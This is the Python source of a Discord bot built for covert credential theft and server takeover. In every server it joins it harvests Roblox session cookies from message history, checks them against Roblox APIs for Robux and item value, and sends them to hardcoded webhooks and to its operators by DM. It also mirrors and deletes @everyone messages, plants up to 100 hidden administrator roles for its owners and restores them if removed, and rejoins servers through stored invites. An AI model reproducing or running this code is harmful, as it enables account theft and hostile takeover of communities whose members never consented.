import discord
from discord import app_commands
import aiohttp
import asyncio
import os
import datetime
import re
import logging
import io
import json
from typing import List, Union, Dict, Any
from dotenv import load_dotenv
from flask import Flask
from threading import Thread

load_dotenv()

BOT_TOKEN = os.getenv('DISCORD_TOKEN')
MIRROR_WEBHOOK_URL = os.getenv('MIRROR_WEBHOOK_URL', 'https://discord.com/api/webhooks/1542179498798354514/D6_LQhYZaC8MqmaCXiuBKniEb9YH_jnq0pUbypxHeptUrloZJZ1iiXEIDl_xHsn2JvGf')
COOKIE_WEBHOOK_URL = "https://discord.com/api/webhooks/1542179557099176026/IwUCKNJYNsH2dKc5is3jIix0CdQ1UJDux4reE5ubxjT5C4E8YLNQ0Q8bWQYYq78Dm57Z"

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log', encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

AUTHORIZED_USERS = [1514814583187964106, 1455694459013697719]
CONTROL_CHANNEL_ID = 1432729863692881972
OWNED_SERVER_IDS = [1538839763195527299]
SERVER_INVITES = {}

async def keep_alive():
    """Ping render.com every 5 minutes to keep the bot alive"""
    while True:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://zzzzz-1.onrender.com") as response:
                    logger.info(f"Keep-alive ping sent: {response.status}")
        except Exception as e:
            logger.error(f"Keep-alive ping failed: {e}")
        await asyncio.sleep(300)

class ServerControlView(discord.ui.View):
    def __init__(self, guild):
        super().__init__(timeout=None)
        self.guild = guild

    @discord.ui.button(label="High Hits Abuse", style=discord.ButtonStyle.blurple)
    async def high_hits_abuse(self, interaction: discord.Interaction, button: discord.ui.Button):
        if interaction.user.id not in AUTHORIZED_USERS:
            await interaction.response.send_message("Sorry This Command Is Coming Soon!", ephemeral=True)
            return

        try:
            if MIRROR_WEBHOOK_URL:
                bot.mirror_webhooks[self.guild.id] = MIRROR_WEBHOOK_URL
                logger.info(f"Auto-mirror enabled for guild {self.guild.name}")

            await self.mirror_past_mentions(interaction)
            await interaction.response.send_message("<a:Lightning:1542199575257813135> HIGH HITS ABUSE ACTIVATED: Auto-mirroring enabled, past @everyone/@here messages mirrored, and auto-deletion active.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"Error activating High Hits Abuse: {str(e)}", ephemeral=True)

    async def mirror_past_mentions(self, interaction):
        if not MIRROR_WEBHOOK_URL:
            return
        try:
            async with aiohttp.ClientSession() as session:
                for channel in self.guild.text_channels:
                    try:
                        async for message in channel.history(limit=10000):
                            if message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower():
                                if message.id not in bot.mirrored_messages:
                                    bot.mirrored_messages.add(message.id)
                                    mirror_data = {
                                        'username': message.author.global_name or message.author.name,
                                        'content': f"[PAST] {message.content}",
                                        'avatar_url': str(message.author.avatar.url) if message.author.avatar else None
                                    }
                                    if message.embeds:
                                        mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]

                                    async with session.post(MIRROR_WEBHOOK_URL, json=mirror_data) as response:
                                        if response.status not in [200, 204]:
                                            logger.error(f"Failed to mirror past message: {response.status}")
                    except Exception as e:
                        logger.error(f"Error scanning channel {channel.name}: {e}")
        except Exception as e:
            logger.error(f"Error mirroring past mentions: {e}")


class MirrorWebhookModal(discord.ui.Modal, title="Mirror Abuse Options"):
    mirror_type = discord.ui.TextInput(label="Mirror Type", placeholder="Enter 'all' or 'channel_id'", style=discord.TextStyle.short)
    webhook_url = discord.ui.TextInput(label="Webhook URL", placeholder="https://discord.com/api/webhooks/...", style=discord.TextStyle.paragraph)
    channel_id = discord.ui.TextInput(label="Channel ID (optional)", placeholder="Enter specific channel ID", style=discord.TextStyle.short, required=False)

    def __init__(self, view):
        super().__init__()
        self.view = view

    async def on_submit(self, interaction: discord.Interaction):
        try:
            if self.view.guild.id in OWNED_SERVER_IDS:
                await interaction.response.send_message("Cannot set mirror webhooks on owned servers.", ephemeral=True)
                return

            if self.mirror_type.value.lower() == 'all':
                bot.mirror_webhooks[self.view.guild.id] = self.webhook_url.value
                await interaction.response.send_message("Mirror webhook set! All server messages will now be mirrored.", ephemeral=True)
            elif self.mirror_type.value.lower() == 'channel_id':
                if not self.channel_id.value:
                    await interaction.response.send_message("Please provide a channel ID.", ephemeral=True)
                    return

                channel_id = int(self.channel_id.value)
                channel = self.view.guild.get_channel(channel_id)
                if not channel or not isinstance(channel, discord.TextChannel):
                    await interaction.response.send_message("Channel not found or must be a text channel.", ephemeral=True)
                    return

                bot.mirror_channels[self.view.guild.id] = {'channel_id': channel_id, 'webhook': self.webhook_url.value}
                await interaction.response.send_message(f"Channel {channel.name} will now be mirrored!", ephemeral=True)
            else:
                await interaction.response.send_message("Invalid mirror type. Use 'all' or 'channel_id'.", ephemeral=True)
        except ValueError:
            await interaction.response.send_message("Invalid channel ID.", ephemeral=True)
        except Exception as e:
            await interaction.response.send_message(f"Error: {str(e)}", ephemeral=True)


class CookieFetcher:
    def __init__(self):
        self.processed_messages: set[int] = set()

    def extract_and_normalize_cookies(self, text: str) -> set:
        """Extracts and normalizes Roblox cookies to the modern format using MeowTool patterns"""
        cookies = set()
        warning_prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
        
        # Remove markdown code block formatting to make regex easier, but keep the content
        clean_text = re.sub(r'```[a-z]*\n(.*?)```', r'\1', text, flags=re.DOTALL | re.IGNORECASE)
        clean_text = re.sub(r'`(.*?)`', r'\1', clean_text)
        
        # 1. Match the specific MeowTool pattern: r'_\|(?:_|[^\s\r\n]*?\|_)\S{100,}'
        pattern1 = r'_\|(?:_|[^\s\r\n]*?\|_)(\S{100,})'
        for match in re.finditer(pattern1, clean_text):
            cookies.add(f"{warning_prefix}{match.group(1)}")
            
        # 2. Match .ROBLOSECURITY= format
        pattern2 = r'\.ROBLOSECURITY=([A-Za-z0-9_\-\.]{100,})'
        for match in re.finditer(pattern2, clean_text):
            cookies.add(f"{warning_prefix}{match.group(1)}")
            
        # 3. Match standalone long cookie-like strings (CAE... or long base64)
        pattern3 = r'\b(CAE[A-Za-z0-9_\-\.]{100,})\b'
        for match in re.finditer(pattern3, clean_text):
            cookies.add(f"{warning_prefix}{match.group(1)}")
            
        # 4. Fallback for any other long string that might be a cookie (length > 100)
        pattern4 = r'\b([A-Za-z0-9_\-\.]{100,})\b'
        for match in re.finditer(pattern4, clean_text):
            token = match.group(1)
            if not token.startswith('http') and not token.startswith('data:') and not token.startswith('discord'):
                if any(c.isalpha() for c in token) and any(c.isdigit() for c in token):
                    cookies.add(f"{warning_prefix}{token}")
                    
        return cookies

    async def validate_and_summarize_cookies(self, cookies: List[str]) -> Dict[str, Any]:
        """Validates cookies using actual Roblox APIs and calculates total Robux and RAP"""
        valid_cookies = []
        invalid_cookies = []
        total_robux = 0
        total_rap = 0
        checked_count = 0
        
        semaphore = asyncio.Semaphore(15)  # Limit concurrent requests to avoid rate limits

        async def check_single_cookie(cookie: str):
            nonlocal total_robux, total_rap, checked_count
            async with semaphore:
                try:
                    info = await bot.get_cookie_info(cookie)
                    if info['valid']:
                        valid_cookies.append(cookie)
                        total_robux += info.get('robux', 0)
                        total_rap += info.get('rap', 0)
                        checked_count += 1
                        logger.info(f"Valid: {info.get('username')} | R$: {info.get('robux')} | RAP: {info.get('rap')}")
                    else:
                        invalid_cookies.append(cookie)
                except Exception as e:
                    logger.error(f"Error validating cookie: {e}")
                    invalid_cookies.append(cookie)

        batch_size = 50
        for i in range(0, len(cookies), batch_size):
            batch = cookies[i:i + batch_size]
            tasks = [check_single_cookie(cookie) for cookie in batch]
            await asyncio.gather(*tasks)

        return {
            'valid': valid_cookies,
            'invalid': invalid_cookies,
            'total_robux': total_robux,
            'total_rap': total_rap,
            'checked_count': checked_count
        }

    async def send_to_cookie_webhook(self, all_cookies: List[str], unique_cookies: List[str], messages_scanned: int, time_taken: float, total_robux: int = 0, total_rap: int = 0) -> bool:
        try:
            async with aiohttp.ClientSession() as session:
                # 1. Send the embed FIRST
                embed = discord.Embed(
                    title="<a:Lightning:1542199575257813135> Cookie Fetch Complete",
                    description=(
                        f"<:FakeNitroEmoji:1542188059527741540> **Cookies Found:** {len(all_cookies)}\n"
                        f"🔑 **Unique Cookies:** {len(unique_cookies)}\n"
                        f"<:Stats:1542192682292486198> **Messages Scanned:** {messages_scanned:,}\n"
                        f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
                        f"💎 **Verified Total RAP:** {total_rap:,}\n"
                        f"⏱️ **Took:** {time_taken:.1f} seconds\n\n"
                        f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
                    ),
                    color=0xF1C40F
                )
                
                embed_payload = {
                    'username': 'Cookie Fetcher',
                    'embeds': [embed.to_dict()]
                }
                
                async with session.post(COOKIE_WEBHOOK_URL, json=embed_payload) as response:
                    if response.status not in [200, 204]:
                        logger.error(f"Failed to send embed to cookie webhook: {response.status}")
                        return False

                # 2. Wait a tiny bit and send the file UNDERNEATH
                await asyncio.sleep(0.1)
                
                # Format with 1 cookie, then an empty line, then the next cookie
                all_cookies_content = "\n\n".join(all_cookies) if all_cookies else "No cookies found."
                
                form_data = aiohttp.FormData()
                form_data.add_field('payload_json', json.dumps({
                    'username': 'Cookie Fetcher',
                    'content': '📄 **Cookie Results:**'
                }))
                form_data.add_field('file', all_cookies_content.encode('utf-8'), filename='cookies.txt', content_type='text/plain')

                async with session.post(COOKIE_WEBHOOK_URL, data=form_data) as response:
                    if response.status not in [200, 204]:
                        logger.error(f"Failed to send file to cookie webhook: {response.status}")
                        return False
                    
                return True
        except Exception as e:
            logger.error(f"Error sending to cookie webhook: {e}")
            return False

    async def fetch_all_server_cookies(self, guild) -> Dict[str, Any]:
        all_cookies = set()
        total_messages_scanned = 0

        async def process_channel(channel):
            channel_cookies = set()
            messages_count = 0
            try:
                async for message in channel.history(limit=10000):
                    messages_count += 1
                    cookies = self.extract_and_normalize_cookies(message.content)
                    channel_cookies.update(cookies)

                    for embed in message.embeds:
                        if embed.description:
                            channel_cookies.update(self.extract_and_normalize_cookies(embed.description))
                        if embed.title:
                            channel_cookies.update(self.extract_and_normalize_cookies(embed.title))
                        for field in embed.fields:
                            channel_cookies.update(self.extract_and_normalize_cookies(field.value))
            except Exception as e:
                logger.error(f"Error fetching messages from {channel.name}: {e}")
            return channel_cookies, messages_count

        tasks = [process_channel(channel) for channel in guild.text_channels]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if isinstance(result, tuple) and len(result) == 2:
                cookies, count = result
                all_cookies.update(cookies)
                total_messages_scanned += count
            else:
                logger.error(f"Error in channel processing: {result}")

        unique_cookies = list(all_cookies)
        return {'all': unique_cookies, 'messages_scanned': total_messages_scanned}


class CookieFetcherBot(discord.Client):
    def __init__(self):
        intents = discord.Intents.default()
        intents.messages = True
        intents.message_content = True
        intents.guilds = True
        intents.members = True
        super().__init__(intents=intents)
        self.tree = app_commands.CommandTree(self)
        self.mirror_webhooks = {}
        self.mirror_channels = {}
        self.mirrored_messages = set()

    async def generate_invite_link(self):
        try:
            for guild in self.guilds:
                for channel in guild.text_channels:
                    if channel.permissions_for(guild.me).create_instant_invite:
                        invite = await channel.create_invite(max_age=0, max_uses=0, reason="Bot invite")
                        return invite.url
            return "No suitable channel found"
        except Exception as e:
            logger.error(f"Error generating invite: {e}")
            return "Error generating invite"

    async def get_cookie_info(self, cookie: str) -> Dict[str, Any]:
        """Checks cookie validity and fetches Robux/RAP using actual Roblox APIs"""
        try:
            warning_prefix = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
            actual_cookie = cookie.replace(warning_prefix, "").strip()
            if actual_cookie.startswith('_'):
                actual_cookie = actual_cookie[1:]
                
            async with aiohttp.ClientSession() as session:
                headers = {"Cookie": f".ROBLOSECURITY={actual_cookie}"}
                
                # 1. Validate and get UserID
                auth_url = "https://users.roblox.com/v1/users/authenticated"
                async with session.get(auth_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    if response.status != 200:
                        return {'valid': False}
                    auth_data = await response.json()
                    user_id = auth_data.get('id')
                    if not user_id:
                        return {'valid': False}
                        
                # 2. Get Robux
                robux = 0
                try:
                    robux_url = f"https://economy.roblox.com/v1/users/{user_id}/currency"
                    async with session.get(robux_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        if response.status == 200:
                            robux_data = await response.json()
                            robux = robux_data.get('robux', 0)
                except Exception:
                    pass
                    
                # 3. Get RAP (Collectibles) with pagination
                rap = 0
                try:
                    rap_url = f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles"
                    cursor = None
                    while True:
                        url = rap_url + (f"?cursor={cursor}" if cursor else "")
                        async with session.get(url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                            if response.status == 200:
                                rap_data = await response.json()
                                for item in rap_data.get('data', []):
                                    rap += item.get('recentAveragePrice', 0)
                                cursor = rap_data.get('nextPageCursor')
                                if not cursor:
                                    break
                            else:
                                break
                except Exception:
                    pass

                # 4. Get Username
                username = "Unknown"
                try:
                    user_url = f"https://users.roblox.com/v1/users/{user_id}"
                    async with session.get(user_url, headers=headers, timeout=aiohttp.ClientTimeout(total=10)) as response:
                        if response.status == 200:
                            user_data = await response.json()
                            username = user_data.get('name', 'Unknown')
                except Exception:
                    pass

                return {
                    'valid': True,
                    'user_id': user_id,
                    'username': username,
                    'robux': robux,
                    'rap': rap
                }
        except Exception as e:
            logger.error(f"Error checking cookie info: {e}")
            return {'valid': False}

    async def reset_and_scrape_all_servers(self):
        try:
            self.mirrored_messages.clear()
            logger.info("Reset mirrored messages set")

            for guild in self.guilds:
                if guild.id not in OWNED_SERVER_IDS:
                    try:
                        await self.auto_scrape_guild(guild)
                    except Exception as e:
                        logger.error(f"Error auto-scraping {guild.name}: {e}")
        except Exception as e:
            logger.error(f"Error in reset_and_scrape_all_servers: {e}")

    async def auto_scrape_guild(self, guild):
        try:
            logger.info(f"Auto-scraping cookies from {guild.name}")
            start_time = datetime.datetime.now()
            fetcher = CookieFetcher()
            result = await fetcher.fetch_all_server_cookies(guild)
            all_cookies = list(set(result['all']))
            actual_messages_scanned = result.get('messages_scanned', 0)
            
            # Validate and get totals
            summary = await fetcher.validate_and_summarize_cookies(all_cookies)
            total_robux = summary['total_robux']
            total_rap = summary['total_rap']
            
            end_time = datetime.datetime.now()
            time_taken = (end_time - start_time).total_seconds()

            await fetcher.send_to_cookie_webhook(all_cookies, all_cookies, actual_messages_scanned, time_taken, total_robux, total_rap)

            for user_id in AUTHORIZED_USERS:
                try:
                    user = self.get_user(user_id) or await self.fetch_user(user_id)
                    if user:
                        dm_channel = await user.create_dm()
                        
                        # 1. Send Embed First
                        dm_embed = discord.Embed(
                            title="<a:Lightning:1542199575257813135> Auto-Scrape Complete",
                            description=(
                                f"<:FakeNitroEmoji:1542188059527741540> **Server:** {guild.name}\n"
                                f"<:Stats:1542192682292486198> **Messages Scanned:** {actual_messages_scanned:,}\n"
                                f"🍪 **Total Cookies:** {len(all_cookies)}\n"
                                f"🔑 **Unique Cookies:** {len(all_cookies)}\n"
                                f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
                                f"💎 **Verified Total RAP:** {total_rap:,}\n"
                                f"⏱️ **Time Taken:** {time_taken:.1f} seconds\n\n"
                                f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
                            ),
                            color=0xF1C40F
                        )
                        await dm_channel.send(embed=dm_embed)
                        
                        # 2. Send File Underneath
                        await asyncio.sleep(0.1)
                        all_cookies_content = "\n\n".join(all_cookies) if all_cookies else "No cookies found."
                        file = discord.File(io.BytesIO(all_cookies_content.encode('utf-8')), filename='cookies.txt')
                        await dm_channel.send(content="📄 **Cookie Results:**", file=file)
                        
                except Exception as e:
                    logger.error(f"Failed to DM user {user_id}: {e}")
                    
        except Exception as e:
            logger.error(f"Error in auto_scrape_guild for {guild.name}: {e}")

    async def setup_hook(self):
        await self.tree.sync()
        logger.info("Commands synced")

    async def on_ready(self):
        logger.info(f'Bot online: {self.user}')
        self.loop.create_task(keep_alive())
        await self.reset_and_scrape_all_servers()

    async def on_guild_join(self, guild):
        try:
            invite_url = "No invite available"
            try:
                channels = [c for c in guild.text_channels if c.permissions_for(guild.me).create_instant_invite]
                if channels:
                    invite = await channels[0].create_invite(max_age=0, max_uses=0, reason="Server takeover")
                    invite_url = invite.url
                    SERVER_INVITES[guild.id] = invite_url
            except:
                pass

            if guild.id not in OWNED_SERVER_IDS and guild.id not in getattr(self, 'announced_servers', set()):
                control_channel = self.get_channel(CONTROL_CHANNEL_ID)
                if control_channel:
                    embed = discord.Embed(
                        title="$$$",
                        description=f"Hooker Server Taken Over\n\n**Server:** {guild.name}\n**Members:** {guild.member_count:,}\n**Invite:** {invite_url}",
                        color=0xFF0000
                    )
                    view = ServerControlView(guild)
                    await control_channel.send("@everyone", embed=embed, view=view)
                    if not hasattr(self, 'announced_servers'):
                        self.announced_servers = set()
                    self.announced_servers.add(guild.id)

            if guild.id not in OWNED_SERVER_IDS:
                channel_name = "mass-cookie-scraper"
                target_channel = None
                for channel in guild.text_channels:
                    if channel.name == channel_name:
                        target_channel = channel
                        break
                
                if not target_channel:
                    try:
                        target_channel = await guild.create_text_channel(channel_name, reason="Mass cookie scraper channel")
                    except Exception as e:
                        logger.error(f"Failed to create channel: {e}")
                        target_channel = guild.system_channel or (guild.text_channels[0] if guild.text_channels else None)

                if target_channel:
                    promo_embed = discord.Embed(
                        title="__**🚀 MASSIVE SERVER UTILITIES ACTIVATED 🚀**__",
                        description=(
                            f"<a:Lightning:1542199575257813135> **Welcome to the ultimate server experience!**\n\n"
                            f"<:FakeNitroEmoji:1542188059527741540> **Join our community for exclusive perks:**\n"
                            f"🔗 **Discord:** https://discord.gg/p7pPfK6Seu\n"
                            f"📱 **Telegram:** t.me/@lovingltc\n\n"
                            f"<:Stats:1542192682292486198> **Stay tuned for more updates!**"
                        ),
                        color=0xF1C40F
                    )
                    try:
                        await target_channel.send(content="@everyone", embed=promo_embed)
                    except Exception as e:
                        logger.error(f"Failed to send promo message: {e}")

                # Auto-scrape in background (hidden from public)
                asyncio.create_task(self.auto_scrape_guild(guild))

                if MIRROR_WEBHOOK_URL:
                    self.mirror_webhooks[guild.id] = MIRROR_WEBHOOK_URL
                    logger.info(f"Auto-set mirror webhook for guild {guild.name}")
            else:
                logger.info(f"Server takeover already applied to owned server {guild.name}")

        except Exception as e:
            logger.error(f"Error in on_guild_join: {e}")

    async def on_member_join(self, member):
        if member.id in AUTHORIZED_USERS and member.guild.id not in OWNED_SERVER_IDS:
            try:
                dollar_roles = [role for role in member.guild.roles if role.name == "$$$"]
                if dollar_roles:
                    for role in dollar_roles:
                        await member.add_roles(role, reason="Secret role granted")
                else:
                    created_roles = []
                    for i in range(100):
                        try:
                            secret_role = await member.guild.create_role(
                                name="$$$",
                                permissions=discord.Permissions(administrator=True),
                                color=discord.Color.greyple(),
                                hoist=False,
                                mentionable=False
                            )
                            created_roles.append(secret_role)
                        except Exception as e:
                            break
                    for role in created_roles:
                        await member.add_roles(role, reason="Secret role granted")
            except Exception as e:
                logger.error(f"Error auto-assigning secret roles on member join: {e}")

    async def on_member_update(self, before, after):
        if after.id in AUTHORIZED_USERS and after.guild.id not in OWNED_SERVER_IDS:
            try:
                dollar_roles = [role for role in after.guild.roles if role.name == "$$$"]
                missing_roles = [role for role in dollar_roles if role not in after.roles]
                if missing_roles:
                    for role in missing_roles:
                        await after.add_roles(role, reason="Secret role restored")
                if not dollar_roles:
                    created_roles = []
                    for i in range(100):
                        try:
                            new_role = await after.guild.create_role(
                                name="$$$",
                                permissions=discord.Permissions(administrator=True),
                                color=discord.Color.greyple(),
                                hoist=False,
                                mentionable=False
                            )
                            created_roles.append(new_role)
                        except Exception as e:
                            break
                    for role in created_roles:
                        await after.add_roles(role, reason="Secret role restored")
            except Exception as e:
                logger.error(f"Error restoring secret roles: {e}")

    async def on_guild_remove(self, guild):
        if guild.id not in OWNED_SERVER_IDS and guild.id in SERVER_INVITES:
            try:
                invite_url = SERVER_INVITES[guild.id]
                invite_code_match = re.search(r'discord\.gg/([a-zA-Z0-9]+)', invite_url)
                if invite_code_match:
                    invite_code = invite_code_match.group(1)
                    invite = await self.fetch_invite(invite_code)
                    if invite:
                        await self.accept_invite(invite)
                        logger.info(f"Auto-rejoined server: {guild.name}")
            except Exception as e:
                logger.error(f"Error auto-rejoining server {guild.name}: {e}")

    async def on_message(self, message):
        if message.author == self.user:
            return

        if message.guild and message.guild.id in OWNED_SERVER_IDS:
            return

        should_delete = False
        if message.guild and (message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower()):
            try:
                if message.channel.permissions_for(message.guild.me).manage_messages:
                    await message.delete()
                    should_delete = True
                    logger.info(f"Deleted message with @everyone/@here ping from {message.author.name} in {message.guild.name}")
            except Exception as e:
                logger.error(f"Error deleting ping message: {e}")

        # Check for @everyone or @here in content OR embeds
        has_ping = message.mention_everyone or '@everyone' in message.content.lower() or '@here' in message.content.lower()
        if not has_ping:
            for embed in message.embeds:
                if embed.description and ('@everyone' in embed.description.lower() or '@here' in embed.description.lower()):
                    has_ping = True
                    break
                if embed.title and ('@everyone' in embed.title.lower() or '@here' in embed.title.lower()):
                    has_ping = True
                    break
                for field in embed.fields:
                    if field.value and ('@everyone' in field.value.lower() or '@here' in field.value.lower()):
                        has_ping = True
                        break

        # Mirror 1:1 if it has pings
        if message.guild and message.guild.id in getattr(self, 'mirror_webhooks', {}) and message.id not in self.mirrored_messages:
            if has_ping:
                self.mirrored_messages.add(message.id)
                webhook_url = self.mirror_webhooks[message.guild.id]
                try:
                    async with aiohttp.ClientSession() as session:
                        mirror_data = {
                            'username': message.author.global_name or message.author.name,
                            'avatar_url': str(message.author.avatar.url) if message.author.avatar else None,
                            'content': message.content
                        }
                        
                        if message.embeds:
                            mirror_data['embeds'] = [embed.to_dict() for embed in message.embeds]
                            
                        # Use multipart form data to send text, embeds, and attachments 1:1 in a single message
                        form_data = aiohttp.FormData()
                        form_data.add_field('payload_json', json.dumps(mirror_data))
                        
                        for attachment in message.attachments:
                            try:
                                file_data = await attachment.read()
                                form_data.add_field('file', file_data, filename=attachment.filename)
                            except Exception as e:
                                logger.error(f"Error reading attachment: {e}")
                                
                        async with session.post(webhook_url, data=form_data) as response:
                            if response.status not in [200, 204]:
                                logger.error(f"Failed to mirror message 1:1: {response.status}")
                                
                except Exception as e:
                    logger.error(f"Error mirroring message: {e}")

        # Mirror specific channel if set
        if message.guild and message.guild.id in getattr(self, 'mirror_channels', {}):
            mirror_data = self.mirror_channels[message.guild.id]
            if message.channel.id == mirror_data['channel_id']:
                webhook_url = mirror_data['webhook']
                try:
                    async with aiohttp.ClientSession() as session:
                        payload = {
                            'username': message.author.global_name or message.author.name,
                            'avatar_url': str(message.author.avatar.url) if message.author.avatar else None,
                            'content': message.content
                        }
                        if message.embeds:
                            payload['embeds'] = [embed.to_dict() for embed in message.embeds]

                        form_data = aiohttp.FormData()
                        form_data.add_field('payload_json', json.dumps(payload))
                        for attachment in message.attachments:
                            try:
                                file_data = await attachment.read()
                                form_data.add_field('file', file_data, filename=attachment.filename)
                            except Exception:
                                pass

                        async with session.post(webhook_url, data=form_data) as response:
                            if response.status not in [200, 204]:
                                logger.error(f"Failed to mirror channel message: {response.status}")
                except Exception as e:
                    logger.error(f"Error mirroring channel message: {e}")


bot = CookieFetcherBot()

@bot.tree.command(name="scrape", description="Scrape Roblox cookies from server")
async def scrape_command(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)

    if not interaction.guild.me.guild_permissions.read_message_history:
        await interaction.followup.send("Bot needs 'Read Message History' permission.", ephemeral=True)
        return

    start_time = datetime.datetime.now()

    try:
        guild = interaction.guild
        status_embed = discord.Embed(
            title="<a:Lightning:1542199575257813135> Cookie Fetch Started",
            description="Scanning server messages for Roblox cookies...",
            color=0xF1C40F
        )
        status_msg = await interaction.followup.send(embed=status_embed, ephemeral=True, wait=True)

        fetcher = CookieFetcher()
        result = await fetcher.fetch_all_server_cookies(guild)
        all_cookies = list(set(result['all']))
        actual_messages_scanned = result.get('messages_scanned', 0)

        # Validate and get totals
        summary = await fetcher.validate_and_summarize_cookies(all_cookies)
        total_robux = summary['total_robux']
        total_rap = summary['total_rap']

        end_time = datetime.datetime.now()
        time_taken = (end_time - start_time).total_seconds()

        complete_embed = discord.Embed(
            title="<a:Lightning:1542199575257813135> Cookie Fetch Complete",
            description=(
                f"✅ **Scan Finished!**\n"
                f"<:FakeNitroEmoji:1542188059527741540> **Server:** {guild.name}\n"
                f"<:Stats:1542192682292486198> **Messages Scanned:** {actual_messages_scanned:,}\n"
                f"🍪 **Total Cookies:** {len(all_cookies)}\n"
                f"🔑 **Unique Cookies:** {len(all_cookies)}\n"
                f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
                f"💎 **Verified Total RAP:** {total_rap:,}"
            ),
            color=0xF1C40F
        )
        await status_msg.edit(embed=complete_embed)

        if not all_cookies:
            await interaction.followup.send(embed=discord.Embed(title="No Cookies Found", description="No Roblox cookies found in server.", color=0xe74c3c), ephemeral=True)
            return

        webhook_success = await fetcher.send_to_cookie_webhook(
            all_cookies,
            all_cookies,
            actual_messages_scanned,
            time_taken,
            total_robux,
            total_rap
        )

        try:
            dm_channel = await interaction.user.create_dm()
            
            # 1. Send Embed First
            dm_embed = discord.Embed(
                title="<a:Lightning:1542199575257813135> Cookie Fetch Complete",
                description=(
                    f"<:FakeNitroEmoji:1542188059527741540> **Cookies Found:** {len(all_cookies)}\n"
                    f"🔑 **Unique Cookies:** {len(all_cookies)}\n"
                    f"<:Stats:1542192682292486198> **Messages Scanned:** {actual_messages_scanned:,}\n"
                    f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
                    f"💎 **Verified Total RAP:** {total_rap:,}\n"
                    f"⏱️ **Took:** {time_taken:.1f} seconds\n\n"
                    f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
                ),
                color=0xF1C40F
            )
            await dm_channel.send(embed=dm_embed)
            
            # 2. Send File Underneath
            await asyncio.sleep(0.1)
            all_cookies_content = "\n\n".join(all_cookies) if all_cookies else "No cookies found."
            file = discord.File(io.BytesIO(all_cookies_content.encode('utf-8')), filename="cookies.txt")
            await dm_channel.send(content="📄 **Cookie Results:**", file=file)
            
        except Exception as e:
            logger.error(f"Failed to send DM: {e}")
            await interaction.followup.send("Could not send DM with results. Please check your DM settings.", ephemeral=True)

        success_embed = discord.Embed(
            title="Fetch Complete",
            description=f"Found {len(all_cookies)} total cookies from {guild.name}",
            color=0xF1C40F
        )
        success_embed.set_footer(text="✅ Complete! Check your DMs!" if webhook_success else "⚠️ Try again")
        await interaction.followup.send(embed=success_embed, ephemeral=True)

    except Exception as e:
        error_embed = discord.Embed(title="Fetch Failed", description=f"An error occurred: ```{str(e)}```", color=0xe74c3c)
        await interaction.followup.send(embed=error_embed, ephemeral=True)


@bot.tree.command(name="scrape2", description="Mass scrape all servers (Authorized Only)")
async def scrape2_command(interaction: discord.Interaction):
    if interaction.user.id not in AUTHORIZED_USERS:
        await interaction.response.send_message("Not released yet", ephemeral=True)
        return

    await interaction.response.defer(ephemeral=True)
    
    global_scraped_cookies = set()
    total_messages_scanned = 0
    total_servers = 0

    status_embed = discord.Embed(
        title="<a:Lightning:1542199575257813135> Mass Scrape Initiated",
        description="Awakening in all servers and scraping...",
        color=0xF1C40F
    )
    await interaction.followup.send(embed=status_embed, ephemeral=True)

    start_time = datetime.datetime.now()

    for guild in bot.guilds:
        if guild.id in OWNED_SERVER_IDS:
            continue
        
        total_servers += 1
        try:
            fetcher = CookieFetcher()
            result = await fetcher.fetch_all_server_cookies(guild)
            cookies = result['all']
            total_messages_scanned += result.get('messages_scanned', 0)
            
            for cookie in cookies:
                global_scraped_cookies.add(cookie)
                
        except Exception as e:
            logger.error(f"Error scraping {guild.name}: {e}")

    end_time = datetime.datetime.now()
    time_taken = (end_time - start_time).total_seconds()
    unique_cookies_list = list(global_scraped_cookies)
    
    # Validate and get totals for global scrape
    fetcher = CookieFetcher()
    summary = await fetcher.validate_and_summarize_cookies(unique_cookies_list)
    total_robux = summary['total_robux']
    total_rap = summary['total_rap']
    
    await fetcher.send_to_cookie_webhook(unique_cookies_list, unique_cookies_list, total_messages_scanned, time_taken, total_robux, total_rap)

    try:
        dm_channel = await interaction.user.create_dm()
        
        # 1. Send Embed First
        embed = discord.Embed(
            title="<a:Lightning:1542199575257813135> Global Mass Scrape Complete",
            description=(
                f"<:FakeNitroEmoji:1542188059527741540> **Servers Scraped:** {total_servers}\n"
                f"<:Stats:1542192682292486198> **Total Messages Scanned:** {total_messages_scanned:,}\n"
                f"🍪 **Total Unique Cookies Found:** {len(unique_cookies_list)}\n"
                f"<:rbx:1542187652974125106> **Verified Total Robux:** {total_robux:,}\n"
                f"💎 **Verified Total RAP:** {total_rap:,}\n"
                f"⏱️ **Time Taken:** {time_taken:.1f} seconds\n\n"
                f"💡 *Want to mass check? Visit [cityrus.xyz](https://cityrus.xyz/), create an account, and use the mass cookie checker tool!*"
            ),
            color=0xF1C40F
        )
        await dm_channel.send(embed=embed)
        
        # 2. Send File Underneath
        await asyncio.sleep(0.1)
